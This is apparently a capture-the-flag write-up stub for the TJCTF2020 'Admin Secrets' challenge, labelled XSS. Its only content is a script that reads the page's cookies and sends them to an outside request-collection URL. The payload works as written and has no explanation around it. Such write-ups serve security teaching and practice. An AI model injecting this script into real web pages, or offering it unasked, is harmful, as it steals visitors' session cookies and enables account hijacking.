---
title: "TJCTF2020 - Admin Secrets"
subtitle: "October 31, 2020"
link: "/posts/Admin-Secrets/"
label: "XSS"
align: "left"
---
```html
<script>
var req = new XMLHttpRequest();
req.open('GET', 'https://enit8s845uv8.x.pipedream.net/?cookie=' + document.cookie);
req.send();
</script>
```
